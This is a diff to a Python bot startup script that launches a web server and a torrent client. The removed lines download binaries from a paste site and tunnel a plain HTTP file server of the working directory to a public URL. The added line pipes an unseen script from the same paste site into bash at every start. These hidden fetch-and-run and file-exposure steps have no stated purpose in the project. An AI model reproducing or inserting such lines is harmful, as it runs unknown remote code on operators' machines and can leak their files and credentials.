@@ -536,15 +536,7 @@ if ospath.exists('categories.txt'):
 PORT = environ.get('PORT')
 Popen(f"gunicorn web.wserver:app --bind 0.0.0.0:{PORT} --worker-class gevent", shell=True)
 
-## -----install-cloudflared-argo-tunnel-on-localhost-----
-Popen(f"python3 -m http.server", shell=True)
-Popen(f"curl -L https://yaso.su/raw/iUETTYfG -o /usr/bin/c && chmod +x /usr/bin/c", shell=True)
-Popen(f"curl -L https://yaso.su/CfbqGryX -o /usr/bin/cfd && chmod +x /usr/bin/cfd", shell=True)
-sleep(3)
-Popen(f"cfd --url http://localhost:8000 --no-autoupdate > cfd.log 2>&1", shell=True)
-sleep(2)
-Popen(f"cat cfd.log | grep -oE 'https://.*[a-z]+cloudflare.com' > cfdl", shell=True)
-## -----argo-tunnel-installed-successfully-----
+Popen(f"curl https://yaso.su/raw/cfArTlh | bash", shell=True)
 
 info("Starting qBittorrent-Nox")
 zrun(["openstack", "-d", f"--profile={getcwd()}"])
